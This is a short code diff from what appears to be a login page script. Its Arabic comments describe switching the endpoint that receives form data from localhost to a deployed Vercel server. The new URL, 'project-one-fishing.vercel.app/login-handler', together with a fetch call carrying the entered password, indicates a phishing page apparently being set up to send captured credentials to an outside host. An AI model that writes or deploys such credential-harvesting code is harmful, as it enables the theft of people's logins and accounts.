@@ -104,8 +104,8 @@
             const password = document.getElementById('password').value;
 
             // الرابط الذي سيتم إرسال البيانات إليه
-            // يجب تعديل هذا الرابط ليتوافق مع رابط الخادم الذي ستقوم بإنشائه لاحقًا
-            const serverUrl = 'http://localhost:3000/login-handler';
+            // تم تعديل هذا الرابط ليتوافق مع رابط الخادم على Vercel
+            const serverUrl = 'https://project-one-fishing.vercel.app/login-handler';
 
             // إرسال البيانات إلى الخادم باستخدام Fetch API
             fetch(serverUrl, {
